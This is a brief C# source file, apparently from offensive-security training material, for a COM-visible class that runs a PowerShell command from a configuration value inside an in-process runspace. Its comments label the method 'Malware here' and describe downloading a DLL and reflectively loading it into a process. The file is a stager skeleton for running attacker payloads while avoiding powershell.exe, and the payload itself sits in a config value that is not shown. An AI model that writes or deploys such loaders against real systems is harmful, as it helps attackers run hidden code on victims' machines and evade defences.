using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace OSEP
{
    [ComVisible(true)]
    public class OSEPRunner
    {

        public static void OSEPExec()
        {
            //Malware here.
            Debug.RunDebug("DLL Artifact PS Runspace Static OSEPExec() has started...");


            //example download dll  and reflectively load it into a process.
            string cmd = $"{CONFIG.PS_STATIC_COMMAND}";


            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }

    }
}